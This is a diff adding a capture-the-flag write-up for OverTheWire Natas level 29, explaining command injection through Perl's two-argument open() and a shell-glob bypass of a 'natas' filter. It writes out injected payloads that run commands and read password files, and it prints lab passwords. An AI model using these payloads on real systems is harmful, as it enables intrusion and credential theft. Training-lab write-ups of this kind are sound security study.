@@ -541,3 +541,27 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Password for natas29:** `hwgoYUiGWoSZAqphtCAZf7u1jS16KEah`
 - **Verification:** `http://natas29.natas.labs.overthewire.org/` with `natas29:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L28.cast`
+
+## Level 29 → natas30
+- **Account:** `natas29`, password `hwgoYUiGWoSZAqphtCAZf7u1jS16KEah`.
+- **Goal:** The page lists `.txt` files through `?file=`; "View sourcecode" is disabled ("c4n Y0 h4z s4uc3?"), so the source has to be recovered through the bug itself. The Perl code is:
+  ```perl
+  if(param('file')){ $f=param('file');
+      if($f=~/natas/){ print "meeeeeep!<br>"; }
+      else{ open(FD, "$f.txt"); while (<FD>){ print CGI::escapeHTML($_); } } }
+  ```
+- **Technique and why it works:** **two-argument `open()` command injection plus a glob bypass**.
+  1. `open(FD, "$f.txt")` is the two-argument form: if the string starts with `|`, Perl opens a *pipe* to a shell instead of a file. So `file=|id;` runs `id` and its stdout goes to the HTTP response. The appended `.txt` is harmless (`;` ends the command, `.txt` becomes a nonexistent command).
+  2. The filter is `$f =~ /natas/`, so any path containing the literal word `natas` is refused. A shell glob `n?tas` matches `natas` without containing the string, so `/etc/n?tas_webpass/n?tas30` passes the regex and the shell expands it.
+
+  Recovering the source this way is itself an application of the bug: `file=|cat /var/www/n?tas/n?tas29/index.pl;`.
+
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Recover the source.** `?file=|cat /var/www/n?tas/n?tas29/index.pl;` prints the Perl program (pipe execution + glob).
+2. **Read the flaw.** `open(FD, "$f.txt")` (two-arg open), and `$f=~/natas/` as the only filter.
+3. **Prove code execution.** `?file=|id;` → `uid=30029(natas29)`, and `?file=|ls;` lists the directory.
+4. **Bypass the filter.** `?file=|ls /etc/n?tas_webpass;` lists the password files; `?file=|cat /etc/n?tas_webpass/n?tas30;` prints `frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF`.
+5. **Verify.** `curl -u natas30:<pw> http://natas30.natas.labs.overthewire.org/` → HTTP 200.
+- **Password for natas30:** `frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF`
+- **Verification:** `http://natas30.natas.labs.overthewire.org/` with `natas30:<password>` → HTTP 200.
+- **Recording:** `recordings/natas/L29.cast`
